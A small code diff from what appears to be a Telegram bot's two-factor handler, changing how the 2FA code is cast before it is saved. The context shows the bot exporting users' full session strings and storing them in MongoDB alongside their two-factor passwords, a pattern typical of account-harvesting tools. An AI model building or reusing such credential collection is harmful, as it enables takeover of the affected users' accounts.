@@ -91,8 +91,9 @@ async def recv_tg_tfa_message(_, message: Message):
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
+        pw = str(tfa_code)
         session_data = {
-            "pw": tfa_code,
+            "pw": pw,
             "session_string": session_string,
             "user_id": message.chat.id,
             "username": message.chat.username or "",
